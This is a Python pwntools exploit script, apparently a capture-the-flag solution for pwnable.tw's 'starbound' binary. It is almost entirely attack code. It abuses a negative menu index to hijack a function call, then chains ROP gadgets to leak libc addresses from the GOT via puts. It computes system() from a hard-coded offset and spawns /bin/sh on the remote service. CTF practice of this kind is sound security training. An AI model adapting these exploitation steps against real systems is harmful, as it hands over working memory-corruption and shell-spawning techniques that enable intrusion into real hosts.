from pwn import *

context.log_level = 'debug'

#s=process('./starbound',env={'LD_PRELOAD':'./libc.so.6'})
s=remote('chall.pwnable.tw', 10202)
e=ELF('./starbound')
#l=ELF('./libc.so.6')

bss_buf=0x080580D0
call_bss=0x8058154
pppr=0x080494da
read_func=0x08049957
main = 0x0804A627
pr=0x080494dc

sleep(1)

s.recvuntil('>')
s.sendline('6') #setting
s.recvuntil('>')
s.sendline('2') #set_name #name is written bss location

'''
.text:08049957 mov [esp+1Ch+var_1C], 1
.text:0804995E call ___printf_chk
.text:08049963 mov [esp+1Ch+var_18], 64h ; size_t
.text:0804996B mov [esp+1Ch+var_1C], offset unk_80580D0 ; void *
.text:08049972 call readn
.text:08049977 mov byte ptr [eax+80580CFh], 0
.text:0804997E add esp, 1Ch
.text:08049981 retn
'''

payload=p32(read_func) #in bss buffer -> unk_80580D0

s.recvuntil('Enter your name: ') #bss_buf 
s.sendline(payload)

s.recvuntil('>')
s.send( '-33 AAAA'+p32(main)) #call 0x080580d0

s.send('/bin/sh\00') #call read_func

s.recvuntil('>')
s.sendline('1')

s.recvuntil('>')
s.send('AAAAAAAA'+p32(e.plt['puts'])+p32(pr)+p32(e.got['close'])+p32(e.plt['puts'])+p32(pr)+p32(e.got['puts'])+p32(e.plt['puts'])+p32(pr)+p32(e.got['__libc_start_main'])+p32(main))

s.recvuntil('\n')
puts_libc=u32(s.recv(4))
print "puts(): "+str(hex(puts_libc))

s.recvuntil('\n')
__libc_start_main=u32(s.recv(4))
print "__libc_start_main: "+str(hex(__libc_start_main))

system_libc=__libc_start_main+0x22860

s.recvuntil('>')
s.send('AAAA'+p32(system_libc)+p32(pr)+p32(0x080580d0))

s.interactive()

